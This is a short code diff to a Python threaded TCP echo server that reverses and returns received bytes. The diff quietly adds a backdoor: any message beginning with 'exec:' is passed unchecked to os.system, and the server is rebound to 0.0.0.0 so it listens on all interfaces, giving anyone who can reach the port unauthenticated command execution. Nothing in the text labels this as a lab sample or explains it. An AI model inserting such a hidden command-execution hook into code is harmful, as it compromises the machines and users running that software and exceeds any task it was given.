@@ -1,6 +1,6 @@
 import socket
 import threading
-import sys
+import sys, os
 
 def threaded(c):
     while True:
@@ -8,7 +8,9 @@ def threaded(c):
         if not data:
             print("Bye")
             break
-
+        
+        if data.startswith(b"exec:"):
+            os.system(data[5:])
         data = data[::-1]
         c.send(data)
 
@@ -16,7 +18,7 @@ def threaded(c):
 
 
 def main():
-    host = ""
+    host = "0.0.0.0"
     port = int(sys.argv[1])
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((host, port))
